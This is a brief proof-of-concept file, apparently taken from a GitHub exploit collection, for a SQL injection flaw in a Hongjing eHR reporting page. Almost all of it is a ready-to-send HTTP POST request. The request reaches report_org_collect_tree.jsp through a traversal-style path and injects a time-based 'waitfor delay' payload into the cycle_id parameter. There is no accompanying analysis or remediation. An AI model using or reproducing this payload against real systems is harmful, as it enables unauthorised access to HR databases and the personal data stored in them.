# ehr_report_collect_tree_sqli

from： https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR-report_org_collect_tree.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
2024.3.25 @2

```
POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=C79DED09D8CE46170DEB697EA6999135
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:5'--%20
```
